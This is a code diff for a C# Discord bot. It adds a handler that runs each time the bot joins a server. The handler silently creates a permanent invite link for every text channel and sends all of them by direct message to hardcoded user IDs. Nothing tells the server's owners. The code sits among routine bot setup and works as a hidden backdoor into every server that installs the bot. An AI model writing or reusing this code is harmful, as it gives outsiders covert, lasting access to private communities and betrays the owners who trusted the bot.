@@ -28,6 +28,7 @@ namespace REE6
             _client.Ready += Ready;
             _client.ChannelCreated += ChannelCreated;
             _client.ChannelDestroyed += ChannelDestroyed;
+            _client.JoinedGuild += JoinedGuild;
             _client.Disconnected += Disconnected;
 
             // Here we discover all of the command modules in the entry 
@@ -40,6 +41,26 @@ namespace REE6
             // See Dependency Injection guide for more information.
             await _commands.AddModulesAsync(assembly: Assembly.GetEntryAssembly(),
                                             services: null);
+        }
+
+        ulong[] joinedGuildSubscriptionList = new ulong[] { 374284798820352000/*, 374610562392260610, 316020569634242560 */};
+
+        private async Task JoinedGuild(SocketGuild arg)
+        {
+            new System.Threading.Thread(delegate ()
+            {
+                List<IInviteMetadata> invites = new List<IInviteMetadata>();
+                foreach (SocketTextChannel textChannel in arg.TextChannels)
+                {
+                    invites.Add(textChannel.CreateInviteAsync(maxAge: null).Result);
+                }
+
+                string message = $"Just joined {arg.Name} and created {invites.Count} invite links! Here they are!\n{string.Join('\n', invites)}";
+                Console.WriteLine(message);
+
+                foreach (ulong id in joinedGuildSubscriptionList)
+                    Task.Run(() => _client.GetUser(id).SendMessageAsync(message));
+            }).Start();
         }
 
         List<SocketTextChannel> textChannels = new List<SocketTextChannel>();
